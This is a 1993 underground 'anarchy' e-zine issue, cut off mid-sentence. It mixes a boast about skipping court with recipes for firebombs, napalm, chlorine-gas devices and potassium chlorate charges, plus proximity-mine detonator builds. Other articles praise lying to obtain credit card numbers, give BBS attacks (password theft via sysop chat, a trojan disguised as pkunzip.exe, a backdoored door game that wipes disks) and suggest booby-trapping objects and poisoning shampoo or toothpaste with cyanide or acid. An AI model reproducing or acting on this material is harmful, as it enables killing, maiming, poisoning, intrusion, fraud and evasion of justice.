FBI  ON TARGET FOR 1999 !    Burn the earth!

-----------------------------------------------------------------------------

Hi there.  Welcome to another classic issue of FBI.  Collect all 6!

I have MANY good excuses for this issue being late.  As usual.  hmm.. If all 
the issues are late, Is it really late?

First.. WELCOME TO 93!  And FBI is now one year closer to 99!

Okay.. the list of usual excuses.

#1.  I moved about 3000 miles away from where I used to live.  And all the 
delays of moving set me back alot.

#2.  This issue was honestly DONE on time.  But it was small, And I wanted to 
put together some more articles for it.  To avoid a problem like 0004.

#3.  I haven't got a telephone yet.  So that slows down EVERYTHING.

#4.  My hard drive crashed again.  From now on, I work off floppies when 
compiling an issue.  Luckily, I was able to salvage all but 3 articles.  One 
of them was this intro, and the other was the logo.  So no big deal.  The rest 
were either OK, or I pieced them back together.


Now, a formal apology.  Levi-First Speaker.  I apologize.  Because this issue 
was so late, I was not able to put in your FALL anarchy file.  So It will have 
to wait.  However, your articles are extremely good, and I do not wish to lose 
you as a contributor.

Oh well.  This issue has the usual monthy stuff, as well as great feature 
articles.  Take a look at the TRAD trojan by Red Dragon.  It's a VERY good 
PASCAL trojan.  And for a bit of fun, fill out the World domination sign up 
sheet, and send it in to be published.

Changes to FBI STAFF.

GaRblEd UsEr - Editor.
Bluesman     - East Coast Editor.
Jailbird     - Staff Author.
Crax         - Staff Author.
Levi-First Speaker - Staff Author/Reasearch.

And as allways we get a few additions from freelancers.

One new addition to FBI.  The skill level rating.  All of our articles that 
require Skill of any sort, are rated at the beginning of the article.  The 
skill rating is based on a 1 to 5 level.
1: Beginner - Just about anyone can understand this.
2: Involved - You need a bit of skill here.  A bit of Experience IS nessecary.
3: Difficult- ALOT of experience is nessecary.  You NEED to know what to do.
4: Hellish  - You had better be an EXPERT on the subject.
5: Godlike  - MANY MANY years of experience are nessecary. DON'T TRY THIS 
UNLESS YOU KNOW EXACTLY WHAT YOU ARE DOING.

Oh yeah..  Our mighty research department is working on quite a few miracles 
for next issue.  If even ONE of these ideas works out, FBI will be famous.

Oh, and watch for a BIG publicity stunt to occur soon.  heh heh.

Well..  Enjoy the issue!!
GaRbLed uSeR-  Thanx for supporting FBI

On with the Show!

------------------------------------------------------------------------------
Skill level: 2 1/2

Good morrow...  Welcome to another non-exciting but useful article By those 
great guys at FBI.  
Well..  actually, just me again..  What a surprise..
Well..  I'll just get down to it this time.. (ha!)  Here we go..

			 -How to ESCAPE-

Escape WHAT? one might ask..  But ask no further..  for I shall answer.  
Ever have a $400 fone bill staring at you?  What about an unwanted jail term 
or massive fine?  Well I did.  Both that is.  And guess what?  

Would I still be an anarchist if I didn't win?  Hell NO!

Step one.  Get yourself into a whole shitload of trouble.  
Step two.  Control, and delay.
Step three.  Run for the border.

Simple eh?  Well thats the end of the text file..  hope you enjoyed it..

(tee hee hee.. I'm in a good mood today.  Don't ask why..)

Anyways..  Lets take my situation.  A certain dickweed judge decided that I 
was guilty of a certain crime, before I went to trial.  Lucky me..  I had no 
hope..   So I took CONTROL of the situation.

6-18-92  :  Garbled User was arrested on the charge of unnecesary Noise.
6-22-92  :  Garbled User was FINALLY picked up, and brought down to the 
station.  Here, a certain ASSWIPE tried to trick him into signing a 
confession.  So Garby agreed.  Chill..  listen..

  You see,  you can't simply sign any old confession.  You have to WRITE your 
confession.  Not only that, but you have to sign away your rights BEFORE you 
sign a certain confession in question.  

Guess what?  No miranda warning.  Yessire..  they couldn't use my confession 
in court.  But..  not to make things easy.. 

 " I, GarBled UsEr hereby declare myself guilty of BBQing Chicken in my 
backyard too loudly.  Silly Me to think that my grill wouldn't fall UNDER the 
82db level of noise.  But anyways, I did it, and I'm guilty.  Hang me"

And yes, I DID sign it, and give it to the bewildered cop.  (Who by the way 
forgot how to boot his computer up, so I had to do it for him.)

This simply pissed the royal hell out of the cop.  But it was a confession, so 
he had to take it.  I then forced him to put a time and date stamp on the 
thing.  Guess what he asked me to sign next?  A MIRANDA STATEMENT.  So I spit 
on it, and signed the part saying I understood my rights.  NOT the part giving 
them away.  And I made him time stamp this too.


7-12-92 : Garbled User goes to court to answer to the charge.  He asks for a 
trial, and a supporting deposition.
	     (A file explaining why you were arrested, and all the evidence to 
be used against you.  They HAVE to give it to you!  If they say no, bitch and 
moan)

8-12-92:  Garbled user gets arrested again, on the same charge, and pulls the 
same stunt.

8-16-92:  A very pissed off jugde tells Garbled that he's going to jail, 
because he failed to show up for court on the 13th like he was supposed to.  A 
very calm Garbled kindly reminds the judge that he never recieved a supporting 
deposition.  And a very very very pissed jugde lets garbled go free, and 
forgets to arrain him on the charge he was supposed to answer to on the 16th.

9-15-92: Garbled goes to court for his trial, and delays it 4 weeks so he can 
search for a lawyer.

10-10-92: Garbled finally goes to court, and bargains with the DA to drop one 
charge, and therby plead guilty to the second one.  Garbled is told that on 
11-04-92 he will be sentanced to 15 days and 150 bux.

10-23-92: Garbled skips town, and moves out of state.

11-16-92: An extensively pissed jugde figures out (finally) that he's been 
tricked, and that he can't extradite with such a pathetic charge.

12-13-92: A very happy Garbled User lives free in another state.  Garbled also 
revels in the fact, that he has no prior CONVICTIONS.  Being that he was never 
convicted of the crimes before he ditched town.


Simple eh?  Now mind you..  this method has it's limits.  For example.. if you 
were to have commited murder, you never would have gotten away with this.  
Second,  if you had to pay bail, you just lost it.  And third, you have to 
LEAVE the STATE.  Simply leaving town will do you no good, and just get you a 
longer jail term. 

What did this save me in the end?  150bux, and a virgin asshole.  Not to 
mention a record, and probably probation.  

What could I have done?  Simple..  I had those forms stamped.  Any judge who 
wants to keep his job, would be keen to notice the ORDER, and the blatant lack 
of one giving away his rights.  Meaning the confession is meaningless.  And 
the miranda statement is void, because it was signed AFTER the confession.  So 
I was arrested, and not read my rights, so I go free.  However, there was the 
second charge..  which I could have probably delayed for about 4 more months..  
but I don't honestly know if I could have gotten out of it. 

And there were a few unpaid bills looming in the background, that were easily 
ditched by NOT sending in a change of address card.  Silly me. 

Now, because of this chain of events, FBI comes to you from the other side of 
the good ol USA, from a nice virgin asshole.  

You win some, You lose some:  What a load of crap.  I never lose, unless I 
don't feel like going through the pain of winning. 


Mind you..  this has not been a one time occurance in my life.  I have even 
managed to delay a certain court charge for a year, and in the end worming my 
way out of it.  Funny, never got arrested for blowing up park benches with the 
thermal cannon, but I allways seemed to get nailed whenever I turned on that 
ol BBQ.  So anyways, suffice to say..  this method is tried, and perfected, 
and works pretty damn well.  Control, delay, book it.  Also helps if you throw 
some confusion in there..  but why be silly.

Hidy Ho!  Wanna take out yer feind?  Read on Nihilist!

		     -How to firebomb the kremlin-

Or..  "Garbled uSeR'S 10 favorite firebombs"

10. Maltov Cocktail

The all time granddaddy of all Firebombs.  And if you don't know how to make 
it by now..  You can stuff your head in a bucket of benzene and breathe 
deeply.

9. STMC

Storage Moltov Cocktails.  As invented by Levi-First Speaker in FBI issue 3.
Breifly, it's a closed bottle, with a rag that can be pulled out when you wish 
to use the firebomb.   

8. Phosene

Fill a jar with kerosene.  Add a SMALL AMOUNT of white or yellow phosphorus.  
Close the bottle.  Now simply break the bottle to ignite.  When the phosphorus 
is exposed to the air, it will ignite, and thus, ignite the kerosene. Lotsa 
fire, and safe to carry.  More on making phosphorus this issue.

7. GasGate

Take a glass jar and add a few drops of gasoline.  Now add just a few pinches 
of potasium permangate. Supposedly it's available in snake bite kits, but I'm 
still a bit skeptical on that one, being that I haven't found it yet.  
Anyways, now close the jar, and shake it around alot, so the gasoline 
completely coats the inside of the jar.  (NOT FILLS IT, COATS IT WITH A THIN 
FILM!)  Now to use this, simply throw it against a hard object, and when it 
breaks, it blows.

6. Plaster Blast

Simple.  Take a pipe bomb, and drop it into a BIG jar full of napalm.  That 
way, the blast will throw the napalm in all directions.  The level of fluid in 
the jar, should be ABOVE the bomb.  Most importantly, The jar should be closed 
to aid in even dispersion.

5.  Cholrine/Terpentine.

  Whole lotta smokin goin on.

1 part Mr Generic Chlorine Bleach.
1 part Mr sub-generic NON-SUDSY Ammonia.
1 glass jar.
Lotsa turpentine.

Ok..  You put the bleach and ammonia together in the glass jar.  Now 
COMPLETLY coat the jar in old rags/shirts/cloth (quickly now!)  Soak the whole 
thing in turpentine.  Drop it, and RUN.  You CAN throw it, but if that jar 
breaks, it will be much less effective.  Mainly..  once enuf Chlorine gas 
builds up, it breaks the jar(which hopefully isn't too thick) and all that 
evil gas reacts with turpentine in the rags to make a big firey mess, with a 
GREAT deal of toxic black smoke to boot.  Turns the whole surrounding area 
black from the airborn carbon.  Altogether a rude thing to do to sumeone.

4.  Blast Oil.

Sticks to nothin.

 1 part acetone.
 1 part 99% Iso-Propyl Alcolhol.
 1 Vengence for all life on earth.

Ok, so it doesn't stick to anything..  PERIOD.  It does however have a nice 
side effect.  You see, it normally burns like Bacardi 151, but after it hits a 
certain temp, thw WHOLE MESS Evaporates...  INSTANTLY.  BIG BIG EXPLOSION.
Especially effective in Maltov cocktails.

3.  Blast gel Comp A.

 Rude, totally rude.

8 parts vasoline. (This stuff is really fun to buy, let me tell you.)
1 part potassium chlorate.
1 Mr. Wipeout #8 Detonator.

Apply, run, detonate.  BIG fireball.  Ok, it's not a firebomb, but if you were 
to put a fuse on that detonator, I will personally guarantee it will stick to 
ANYTHING.  We're talkin glass celings here.

2.  Blast Gel Comp B.

 Evil shit.  Totally nasty.  As a matter of fact, it's outright mean.  

Fill a bottle 2/3 full of Acetone(nail polish remover).

just add a WHOLE lot of para-dichloro-benzene.  (Mothballs, Vanish Dropins)

Now shake vigorously, and wait until it's all dissolved.  Might take a day or 
so.  Anyways..  you will get this ugly yellow shit.  Doesn't stick to 
anything, but it burns with a fury.  And, there will be small little clear 
globuoles at the bottom.  Don't know WHAT these things are, because we can't 
isolate the fuckers in enuf quantity to test em, but they explode with a fury.

1.  Napalm!  Yes.. my bloody favorite!  Ok, so it's not the real military 
stuff, but it's just as good.  

  Take a wine bottle 2/3 filled with gasoline.  Now add styrofoam.  Any foam 
will do nicely.  Foam peanuts, molded foam, or boring old McDonalds burger 
containment devices.  Make sure the WHOLE thing is a nasty green glob of 
slime.  Not only does this stuff stick to celings, but it BURNS evil hot, and 
it releases BIG clouds of black, suffocating, toxic smoke.  And.. If you order 
now, as an added bonus...
Kindling inflammablilty.  
What does this mean to you?  Well, this means, if you are covered with burning 
napalm, and you jump in a pool.  The napalm will be extinguished.  BUT.. When 
you come back out of that pool..  POOF..  On fire again.  INSTANTLY.

A quick Recap of the top 10..

10. Maltov Cocktail
 9. Storage Maltov Cocktail
 8. Phosene
 7. Gasgate
 6. Plaster Blast
 5. Chlorine/Turpentine
 4. Blast Oil
 3. Blast Gel Composition A
 2. Blast Gel Composition B
 And the number one firebomb of all time..

   NAPALM.  What else?

Well folkies, thats all.  Next issue, we take a look at another top ten list..

Garbled User's top 10, favorite chemical weapons!  Iraq ain't got nothin on

	     Garbled user here.  Who else?  Like I have employee's or 
		      something wild like that.  (HINT)

		       -Putting Honesty In It's Place-

The garbage can.

Lets be realistic for one moment.  Where has being honest gotten you in life?  
not very far, right?  I thought so.

I remember when I was a wee one in school.  And like all children, there were 
times when I forgot to do my homework.  And of course, the teacher would ask 
why I didn't have it.  I would simply tell the truth.  "I forgot about it"
Of course, my teacher didn't help this. "Is that the best excuse you can think 
of? Think of a better one in detention."  However, I soon decided to try a 
different approach.  "Well, There was a family emergency"   Whenever I said 
this, ya know what happened?  Scott free.  (who is scott anyways, and why is 
he free?)

Ok..  now wasn't that nice?  And since this isn't one of my lameo editorials..  
WHAT IN HELL IS IT DOING IN FBI PRESENTS???

Good question, wish I had an answer.  But being the Editor/Owner/Founder/Sole 
Member I can do anything I damn well please.

Anyways.. now on to a practical aplication of what I have said here.. er 
there...  ^ ^ ^   yeah..  umm..  rite.

WHAT DOES THIS MEAN TO YOU?

Ok.. lets say you want something..  for whatever purpose it may be..  LYING is 
the only way it will probably get done.

Lets take a small quiz shall we?


1. You want to buy massive amounts of chemicals to start an explosive factory.

Do you:

A.  Tell them that you want to buy 14 gallons of astrolite to build a 
sub-nuclear warhead.
B.  Tell them you need 14 gallons of hydrazine to determine it's impact on the 
ecosystem.
C.  Tell them you will eat their dog if they don't sell you the hydrazine.

2. You want the phone number to the FBI computer in DC.
A.  Tell them you want to hack in and cause hell in the nation's security.
B.  Tell them you are agent 006.9 and you forgot the number.
C.  Explain to them that the world will come to an abrupt end if you don't 
halt a child process by noon.

3. You want to make a free call to your cousin in Oregon.
A.  Tell the operator that you have no money.
B.  Tell the operator that the payfone just ate your last 42 quarters.
C.  Tell the operator you will eat the fone if she doesn't put you through.

4. You want Old Mother Rita's Credit Card Number.
A.  Tell her you want to go on a shopping spree.
B.  Tell her you are selling Handicapper Light bulbs.
C.  Tell her you will rape her dog if she doesn't give you her CC#.

5. You want to sell a stolen car to an old lady.
A.  Tell her it's stolen, but not to worry, because the owner is dead.
B.  Tell her you lost the title, but all she has to do is go to the DMV and 
ask for a new one.
C.  Kill her, and take the cash and the car.

The correct answers are...
(drumroll)
B,B,B,B,C.

Well..  so I couldn't resist on that last one..  but in all seriousness, its 
easy to see how this sort of lying can aid you.  As a patron of the semi-legal 
arts, it is more than obvious in ANY of these cases that the truth would only 
casue INVARIABLE problems.  And though you might not win 100% of the time by 
lying, the truth will get you nowhere!  And answer C..  Well..  let's be 
realistic shall we?

Ok..  You know this right?  I should hope so. So what good does my repeating 
it to you do?  (let me think on this one for a minute...)
(few more)
Alot of people simply don't realize the effect that the truth has on the world 
today.  We live in a society based on lies.  Watch TV, Watch those 
commercials.  Oh come on.  And us PHA's are never one to go against the flow.  
The point is this.  If you want to become anything in the world of cyber 
lunacy, you had better be breifed on the #1 basic principal of social 
engineering.  And as we all know, Social engineering is the basis for ALL 
Phreaking/Hacking and most anarchy.  Ever try to crack a password?  What's the 
logical idea?  Search his office, think about names,dates and events that are 
important to him.  This IS social engineering.  No matter who you are, or what 
you stand for, you NEED to lie.


HOW To lie.

Now this tiny tutorial isn't HALF as good as the one printed in FBI Issue 3.
If you want a VERY good tutorial on this stuff, Gunner did his best, so grab 
that old issue and take a nice long look at it.

Anywayz.  Step one..  think.
What are you trying to do here?  Convince your target that what you are saying 
is the truth.  Even more importantly, you have to convince them that you too, 
sincerely beleive this to be the fact.

Now CONVINCE yourself.  Tell yourself the lie over and over. Tell it until you 
can pass a lie detector test with it.  Until you SINCERELY beleive what you're 
saying.  

Now Run the lie, and possible questions, or events that could transpire 
through your head over and over.  Make sure you have worked out EVERY possible 
problem in advance.

Now lie.  Keep yourself composed and calm.  DON'T freak, if things start going 
wrong, DON'T ABORT.  Hold to it like the truth, and it might just be accepted 
as such.

Now it's true, some people are born liars,  they can lie off the tops of thier 
heads.  Thes people don't NEED this file.  But for the rest of you, this will 
suffice.  It is NOT unusual to go through an hour of prep for a 2 second lie.  
If the results are worth it, DO IT!

There..  Now get off yer BUTT, and lie it off!  And for more reading on the 
subject, read FBI 0003, and watch future issues.

-----------------------------------------------------------------------------
Good morrow common citizens, and welcome again to Marry Stoufer's Wacked
America.  Today we will be studying the curious human, in it's natural 
habitat. But first, a warning.  This may contain scenes that are too graphic 
(It IS 80 columns) or too violent for children.  So be cautious.

Quietly, our reporters enter the disturbing home of these wild creatures. 
Suburbia as our scientists have labeled it.  Look around you, and you can see 
the strange things they have built.  Each area seems to be constructed around 
a living abode.  And surrounding this abode is an area of grass.  Perhaps this 
is some sort of territory.  We can see here that they mark thier territory 
with large imposing wooden structures, that seem to block out others from 
entering.  The entire area seems to be interconnected by a strange black 
substance on the ground.  Perhaps this is some sort of scented trail for these 
creatures to follow to find one another.  We have noticed that each house has 
curious markings upon it that appears to distinguish it from the others. 
Though oddly enough these domiciles are significantly different that no such 
markings seem to be necessary.

Our cameras have just found one of these curious beasts leaving his domicile. 
It appears to be the male of the species.  It has re-entered it's domicile, 
and now has extunt with some sort of strange machine.  Oh dear me!  What a 
racket!  This odd machine seems to have created a loud grinding sound, and the 
human is now pushing it around his domicile.  What a pointless ritual.  Wait, 
the female of the species has exited the house.  The human has stopped using 
the machine.  They appear to be conversing in some way.  Good lord!  They are 
attempting to kill one another!  The female appears to have left the 
confrontation, and is moving down one of the strangely scented paths.  This 
ritual of pushing the loud machine around one's domicile appears to be some 
sort of mating call.  But why the two partners attempted to assault one 
another with vicious bites to the face, is still beyond my comprehension.  The 
male has begun his ritual again.  Perhaps the attacks are part of this mating 
ritual.  Let us move on to another subject.

This subject appears to be throwing some sort of weapon at his canine.  Yet 
the canine seems to be grasping the weapon, and returning it to the human. How 
odd.  But yet, here is another example.  Look, some sort of mating war has 
arisen.  One of the younger males, is fighting a mature male, in what seems to 
be a quest for the female that is watching.  They appear to be throwing a 
large hard sphere back and forth, attempting to kill eachother.  Perhaps the 
younger male is attempting to gain the favor of the female.  Ho! What is this? 
one of the males appears to have won the fight.  The younger male has fallen 
to the ground and attempts to be writhing in pain.  The female has run over to 
the younger male, and seems to be caring for it.  Apparently the females of 
this species only mate with the loser's of such fights.  Now the elder male 
appears to be rushing over also.  What a strange mating rite.

We now look back to the male who was performing his mating ritual.  The female 
has returned, and after attacking one another, they enter the domicile.  We 
are now going to move in closer, to investigate the ritual.  It would appear 
that this strange machine in some way cuts the grass in front of the domicile. 
Why do the humans keep this grass, if it is evident they want to destroy it in 
such a manner?

We are now going to attempt to see inside the domicile to possibly view the 
actual mating of these creatures.  We can see the male eating some sort of 
food from his store.  And the female seated in front of us.  The male has 
appeared to have spotted us, and is behaving erratically.  Perhaps we have 
surprised it.  He appears to be yelling at some sort of decoration on the side 
of his domicile, and the female seems to be rushing out of the room.  Wait! 
There appear to be humans behind us!  They are all dressed in a similar blue 
costume.  Perhaps we will see this strange mating practice after all.  Oh my! 
the Humans are attacking us, and pulling us into thier strange machine!  We 
are doomed!  

Luckily, this video documentation was found in front of one of the human 
domiciles, untouched.  Someday, maybe someone will be lucky enough to 
understand these curious creatures.  But for now, many questions will have to 
go unanswered.  Unfortunately,the reporter that filmed this clip was never 
seen again.  What brutal creatures.

			     How to crash a BBS

Written BY: GaRblEd uSEr
Special thanx to Narcosis, who so wonderfully allowed me to test all of these 
to see if they really worked.  Way to go Narc!

			      General tactics.

Upload the following files.
COMx, LPTx, PRN, AUX, CON, CTTY, CLOCK$.SYS, NUL.

Any of these will kill a BBS.  BUT,  Some boards are immune to these.
such as, WWIV 4.2, Telegard 2.7, celerity 1.4, RBBS, pcboard, wildcat.
Any LSD BBS will fall pray to this bug..  at least when using batch uploads..

				  TELEGARD!

  Telegard is pathetic.  And I just love taking boards out with this one.

First, create a macro, to do the following.

Clear the screen, and put in some fake line garbage.
Change the color to black on black.
/type c:\bbs\gfiles\user.lst

or wherever your enemy keeps his bbs..  (c:\telegard\  etc..)

change the color to normal, clear the screen, put in more garbage.

Now, call the sysop, when he pulls you into chat, run the macro.  Now you 
have his login password in your scroll back buffer.  Use the same method with
/type c:\bbs\status.dat

This will contain the following information IN THIS ORDER!

Sysop's directories..
BBS Name,Number,sysop.
Sysop password.
New user password
Shuttle logon password.

You can go thru his board and rip it apart with your new found access.

The trick to this one is simple.  Telegard has these NICE little chat 
options.  I think if you type /? in chat, It will show them to you.  Simply 
typing that command, (with the drive letter of his userlist!) will show his 
userlist on the screen.  What the sysop might not know, is that his account 
will be the only one shown, and his password will be in an unencrypted form, 
along with his phone number.  Now you can just wait until about 4am and call 
in under his name.

To any 2.7 Telegard BBS, you can simply upload pkunzip.exe and you will have 
instant 255 access.  It works..  trust me!  You can do some nasty shit with 
255..  heh heh..  This one only works SOME of the time..  I had it work on 
one bbs, but not on another.  Also.. idiotic sysops who do not have a COMSPEC 
set, you can upload command.com  If you are lucky, and...
1) they run a filedoor
2) they shell to dos
3)  they are real stupid
you can crash it with that, by uploading an ANCIENT version of it, so when it 
loads, it will not run.

Using batch transfers you can upload device drivers when the system isn't 
expecting it..  2.7 won't fall for this very well..  But i have noted this. 
If you upload clock$.sys it will crash.  If you batch upload it without 
telling the system you are going to, It will wipe out.  Just SAYING you are 
going to upload clock$.sys will crash a BBS.  Don't worry, it will even give 
you a cute little message saying <> System error occurred at XX:XX on XX/XX 
<> and THEN hang.  It's funny as hell.  

And of course the device drivers work too!  You can't batch them, because 
Zmodem will ignore them.  HOWEVER, just going to the file menu, and saying.. 
Upload:
Filename:____________
And any one of the following.
NUL, CON, COMx, LPTx, AUX, PRN.
They all drop the system like you wouldn't believe.  It searches for the 
file, then asks you if you want to upload "CON. " [Yes]  Just hit Y and the 
board goes...
*>> System error OCCURRED at 09/15/99 12:45:31 <<*
The bbs will be in stall city right there.


				    WWIV

So the old pkunzip trick works!

Upload a zipfile, containing a file named pkunzip.exe

This file should be something like this..
program crashwwiv1.1;
uses dos;

var f : text;
i : integer;

begin
  assign(f, 'clock$.exe');
  rewrite(f);
  for i := 1 to 40 do begin
  writeln(f,i);end;
  close(f);
end.

compile this, and name it pkunzip.exe

Now, upload the zip, containing this program.
Go to the file menu, and extract this zip.  Do nothing.  Extract another zip.  
BOOM, it runs pkunzip.exe because it is in the current path.. YOUR 
PKUNZIP.EXE!!

Another thing to do, is make your pkunzip give you 255 access, or whatever 
the hell you want it to!

Upload an ansi bomb, as a message.  This will ruin all the user's dayz!

A trick that works well, is to upload a fake ansi code to the message area.  
like ESC[123434543;129348;x  WWIV will see this, and crash out.

				     LSD

LSD is simple to crash.  Logon during matrix hours, and input the password
JELLYDONUTSRULE
 You now have full access to the system.  You can DO ANYTHING!

				     RA

RA is pretty good security wise.  The only way to take an RA out is to use 
it's own doors.  You see, RA doesn't handle coming back from doors very well, 
and has a bit of trouble if you drop carrier WHILE it's reloading the system.  
Another cute way to take out an RA is to set up your own copy of Front Door.  
Set it up with a nodelist downloaded from the BBS you wish to crash.  You can 
then call it up, and play around with it, and crash thier mailer..  It's not 
too hard with a little practice.  This trick will work on just about any 
fidonet compatible system using FroDo, Binkley, or D'Bridge.

			       The DOOR method

This one is a bit difficult, and requires some programming experience.  Call 
around, and try to pick up the source code to a popular door of some type.  
Now take the source, and add a few neet options.  Whether real or not, so it 
looks cool. Now take out all that registration crap, so the sysop believes 
it requires no registration at all.  Now heres where you make it count.  Take 
one of your fake options, and do this..:

Ok.. say its a space game like tradewars..  Add a "warp to any sector option"
now when the player selects WARP, it will say, What sector?
Now, if the player tries to warp to say.. sector 4000 (in a 2000 sector 
universe) it will say..
"In order to make this jump, you need clearance from the high command!  What 
is the high command warp passcode?"
Hardcode a password in there.  Something REAL hard to get.  Now, this is all 
just in case some user, or the sysop accidentally hits that sector..  They 
will believe it is some advanced game feature.  Now you log on, play the 
game, and put in the passcode.  Now what should happen now?  Well if you had 
any brains, you'd figure out that this little BACKDOOR should drop you RIGHT 
TO DOS!  Have the door load up a second command.com and put YOU in control.  
From here, you can wipe the sysop logs, and all traces of your existance.  
And do as you wish to the BBS.  Fell free to format HD's, wipe out 
directories, and whatever other havok you would like to preform.  Like maybe 
running or installing one of our patent FBI trojans!


Next month, i'll come up with some more advanced methods, gimmie a chance to 
take a few out!  :)

			    _How_To_Build_A_Phone_
			   ------------------------

Garb ere.

One of the most important things a budding young freak can do in his life, is 
to build a phone.  Not that building a phone has any true meaning whatsoever.  
but the first step of phreakin, is to have a GOOD understanding of the 
principals of how a telephone operates.  I can sit here, and explain to you 
all about the tip, the ring, audio handling, ANI, pulsing DC, Audio 
transformers, impedence, etc. etc.  but it means nothing.  You learn by DOING. 
NOT by reading.  Any idiot can sit down, and memorize fone voltages, and 
switching station information.  But they can't go and apply it.  You ask one 
of these idiots HOW a blast box works, and they sit there all day looking 
through thier files.  Actually sitting down, and perfoming the simple action 
of building a phone, will help you understand how current is carried through a 
line.  How your voice, tones, or electric jolts (heh heh) are sent from point 
to point.  So..  without further ado...  The ingredient list.

Set oven to 450.

mix one 0.2 Watt speaker with copper wire, and a small microfone.
Filter mixture through 1:1 audio transformer.  Add one modular plug, and pour 
mix into 2 X 7 box.  Add STDP switch for flavor.

he heh..  Couldn't resist.  Well if you REALLY want to learn.  Stop here.  And 
build it yourself.  It takes NO intelligence at all.  But I'll run through it 
for those of you who have no hope of ever becoming real freaks.

Just so you can kid yourself.  For checking your work..  yeah.. thats the 
ticket.

Run red and green wires from both the microfone, and the speaker.  Pair and 
attach the like colors, and run them through the transformer.  Add the switch 
into the line, after the transformer.  Now run the phone wire down to where 
you wish to place the plug.  Attach it, house the whole thing up, and yer 
done.  Plug it in, and turn on the switch.  You should hear a dialtone.  This 
is a simple fone.  VERY simple.  Now here's the challenge.  Using just a 
simple buzzer, and a transistor, make a ringer.  If you can do that..  you 
have hope of becoming a real freak.  YES I KNOW HOW..  This is a challenge you 
idiot.

sheesh.

			       Presents...

			      -Proximity Mines-

The all hailed Garbled One here..

     Here we gooo..

  yeah,  Anyways..  this year, (thats about how quickly my issues seem to get 
out)  I'm presenting an article on proxmines.

What IS a proxmine?  Dumb question..  watch some star trek, or a good spy 
movie..  Those cool things where when you come within a certain radius of them 
they hit the celing and explode.  Keen weapon.  However, the big trick is to 
get the proxmine to go off when someone comes within the kill radius.  Blowing 
up a grenade when someone comes within 1 mile of it is dumb.  The second major 
problem is sensitivity.  You need to find a sensitivity rating where it will 
pick up slow movement (like the bomb squad sneaking up on it) but it won't 
nuke a nearby mouse or fly.  Big problem is when some idjit sets the 
sensitivity to max, and ends up taking out a cockroach with a tub of 
astrolite.

Ok anyways.. now how do you make one?  Well, first, In order to play with the 
big toys, you need the big bux.  So if you are on a budget, yer playing the 
wrong game.

Method A) Budget Boomie!
Approx cost for detonator - $50.

What do you need?

Wire
Wire cutters
Electric detonator (low voltage) (1.5-9) The lower, the better.
One "Spy Tech official 006.9 motion detector"

It's a stupid toy that beeps and hollars when you walk by it.  I think it uses 
some sort of microphone and an amplification device to "hear" motion.  I could 
be wrong.  Then again maybe thats what all of them do..  I'm not an expert, 
and will admit, I've never tried this budget version.

Anyways, open her up, and replace the speaker with the detonator.  You might 
want to test it first, but it's up to you.  Anyways..  Before you do, 
expirament with it to find the best sensitivity/range.  Then melt it into 
place.  (Don't want the bomb squad disarming it by turning the sensitivity 
down!)

Now the big problem.  Do you see it yet?  Well here it is.  Turn it on.  Now 
what?  Walk casually away and get blown up?  Hmmm.
You need a timer!  Ok..  this should be EASY.

Ya need the followin shit.

S2   1 SPST toggle
S1   1 SPST Normally off pushbutton
     1 500 Ohm 6-9v relay
D1,2 2 1n914 Diodes
     1 555 timer chip
C2   1 .01uF Capacitor
C1   1 Capacitor AT LEAST 10uF, but the larger the capacitence, the longer the 
       delay.
R1   1 1meg potentiometer (var. resistor)
R2   1 10k Resistor
     1 9v battery.


Ok follow the little diag.

			|       |     |        |   |  |
			+-------+-----+--------+---+--+
				      |
				     GND

Simple..  right? not quite..
 Find the switch that turns the proxdetector on.  And solder the two leads
coming from the relay in and replace that switch.

Ok, now how to use it..  EZ.  turn S2 OFF, and hold S1 down breifly.  Now flip 
S2 to the on position, and BOOK IT!

Now before you go hooking the detonator in, as always TEST IT.  If it beeps 
when you run, get a bigger capacitor for C1.

Now go blow someone up.


Method B)
Approximate cost $150-$200.

What you need.

Car Alarm proximity detector (with one of those nifty remote keychain armers)
12 volt battery
Detonator

Simple.  Just hook the car alarm into the battery, and run the speaker(buzzer 
whatever) wires into the detonator.  Now GET OUT OF RANGE, and arm.

This is the failsafe version.  This is REAL quality.  It's gotta be one of 
those new-fangled fancy alarms that beep when someone comes NEAR the car, not 
the normal motion detector of a car alarm.  And the keychain allows you to arm 
it from outside of the Kill or Maim radius.


Now wasn't that easy?  Now set one up, and watch the bomb squad go into 
convulsions when they see it.  Frighten your neighbors, cause chaos at the 
office.  Hours of fun.


Oh by the way,  This has nothing to do with anything..  but I thought it was a 
funny story...

If you know me, I have a very long, very black trench coat.  And I don't look 
all to wholesome, to say the least..  anyways..

A black kid comes up to me..  had to be about 17 or so..

"Hey, you got a gun in there or what?"

"Who me?  No." (me)

"Damn, you could keep a shotgun in there...  c'mere a sec.."

"huh?  yeah?" ::trudge trudge::

"Ya wanna buy one?" (showing me a very nice 9mm)

"WHAT?  ARE you serious??" (laughing nervously)

"Yeah..  I mean, it's not on me now, but hey, I got all types, proximity, 
thermite, shrapnel, you name it.  And I've even managed to tone down the blast 
radius to 'urban neighborhood'"

			 Inovative Ideas In Anarchy
			 
			 Written By : JailBird/RMJCC
			 With Help From : GaRBLed UsEr

	Here are some totally insane ideas for those of you out there who
    like to be destructive, but just plain lack the cunning or imagination
    (or stupidity in some cases) to come up with these fucked up ideas.
    This is only intended to be a set of guidelines for you to pattern 
    your destuctiveness after.
    
    * Exploding Golf Clubs 

      Put some sort of contact explosive inside the round part of a driver    
      and make it look like nothing is wrong with it so when someone uses
      it, **BOOM**
    
    * Explosive Pencil Scharpeners
      
      The pencil scharpeners at school or wherever could easily be turned
      into a lethal weapon with a few minor modifications... Think about it.
      There is a grinding mechanism inside the casing, which leads one to
      believe that a small amount of black powder in the mechanism could
      produce a minor incendiary explosion.  Perhaps some of you brighter
      anarchists out there could find a way to PROPEL the pencil from the
      pencil scharpener into someone's neck or arm. Many possibilties 
      with this one.
    
    * Various Liquids Added To Shampoo
      
      You could be especially vicious with this one... HCl (hydrochloric
      acid) could produce some rather interesting (and permanent) scars
      on someone's head (not to mention the baldness)..... How about a 
      contact poison? Cyanide? NAPALM!?!??! heheh

    * Putting Stuff Into Hair Styling Gel Or Toothpaste
      
      Almost anything could be put into hair styling gel to make it lethal,
      like the shampoo.. Cyanide again works well to annihilate people, as
      does the hydrochloric acid.  I wouldnt recommend anything like air-
      plane or super glue as the shit tends to plug up the containers, which
      might be funny, but not very effective when it comes down to maiming.

    * Explosive soda machines

      Now this one has some interesting possibilities.. You could put a 
      trigger mechanism in the chute where the cans come out so that anyone
      who buys a soda would trip the trigger and get blown up.. Maybe the
      next person who buys a Slice is doomed?  The only problem with this
